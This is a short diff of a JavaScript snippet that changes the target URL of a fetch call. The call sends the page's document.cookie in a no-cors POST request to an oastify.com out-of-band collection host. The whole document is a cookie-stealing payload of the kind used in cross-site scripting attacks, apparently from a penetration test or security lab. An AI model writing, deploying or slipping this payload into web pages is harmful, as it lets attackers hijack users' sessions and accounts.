@@ -1,4 +1,4 @@
-fetch('https://wtt1okl0tl70ilfwwsxbklo89zfq3gr5.oastify.com', {
+fetch('https://5gmxqa0p43eq7ulqsywotcet9kfb31rq.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
